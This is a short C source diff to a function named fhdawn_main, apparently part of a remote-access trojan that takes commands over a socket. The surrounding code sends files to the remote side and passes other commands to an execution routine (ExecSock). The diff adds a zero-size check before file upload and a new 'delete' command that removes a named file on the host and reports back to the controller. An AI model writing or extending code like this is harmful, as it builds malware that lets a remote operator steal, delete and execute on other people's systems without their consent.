@@ -241,6 +241,12 @@ void fhdawn_main(void)
                         long filesize = ftell(fs);
                         fseek(fs, 0, SEEK_SET);
 
+                        if(filesize <= 0){
+                            sockprintf(sockfd, "File '%s' is of 0 bytes.", fileinfo[1]);
+                            upload = FALSE;
+                            break;
+                        }
+
                         sockprintf(sockfd, "FILE:%s:%ld", fileinfo[1], filesize);
                         Sleep(1000);
                         char fbuffer[500];
@@ -337,7 +343,22 @@ void fhdawn_main(void)
             else {
                 sockprintf(sockfd, "Directory Changed to '%s'", cDir());
             }
+        } 
+
+        else if (strstr(recvbuf, "delete") != NULL)
+        {
+            memset(fileinfo, '\0', 3);
+            split(recvbuf, fileinfo, ":");
+            if (isFile(fileinfo[1]))
+            {
+                remove(fileinfo[1]);
+                sockprintf(sockfd, "DEL_OK,%s,%s", fileinfo[1], cDir());
+            }
+            else {
+                sockprintf(sockfd, "File '%s' does not exist.", fileinfo[1]);
+            }
         }
+
         else {
             ExecSock();
         }
